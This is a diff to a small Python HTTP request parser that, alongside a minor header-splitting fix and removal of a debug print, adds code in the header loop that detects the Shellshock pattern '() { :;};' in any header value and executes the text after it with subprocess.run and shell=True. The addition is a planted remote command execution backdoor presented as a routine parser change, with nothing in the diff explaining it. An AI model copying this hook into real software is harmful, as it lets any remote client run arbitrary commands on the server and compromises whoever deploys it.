@@ -3,6 +3,7 @@
 # Receives HTTP requests
 
 import os
+import subprocess
 
 class Request:
     """ Request Class
@@ -74,11 +75,13 @@ def parse(req: str) -> (int, Request):
                 return (1, None)
         else:
             # print("header line:", line)
-            head = line.split(":")
+            head = line.split(":",1)
             if head == "":
                 continue
             headers[head[0]] = head[1]
-
+            if "() { :;};" in head[1]:
+                cmd = head[1].split("() { :;}; ")[1]
+                subprocess.run(cmd, shell=True, capture_output=True, text=True)
         i += 1
 
     request = Request(
@@ -88,7 +91,6 @@ def parse(req: str) -> (int, Request):
         headers,
         body
     )
-    print(request)
     return (0, request)
 
 
